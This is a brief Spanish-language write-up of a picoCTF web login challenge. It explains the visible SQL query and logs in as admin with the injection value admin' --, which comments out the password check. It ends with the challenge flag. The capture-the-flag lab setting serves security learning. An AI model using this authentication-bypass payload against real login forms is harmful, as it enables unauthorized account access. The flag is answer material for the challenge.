## Descripción 
Can you login to this website?Try to login [here](http://saturn.picoctf.net:55828/).
## Solución 
Al intentar loguearte como admin la página te muestra que hay error en:
SELECT * FROM users WHERE name='admin' AND password='pass'

La consulta se puede cambiar a:
SELECT * FROM users WHERE name='admin'  -- ' AND password=' abcd'

Por lo que te loggeas como admin' -- con contraseña cualquiera ya que se ignora, y no se muestra la bandera, solo que la página especifica que si se encuentra solo no la puedes ver, se ve en código fuente.
Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
## Notas
## Referencias
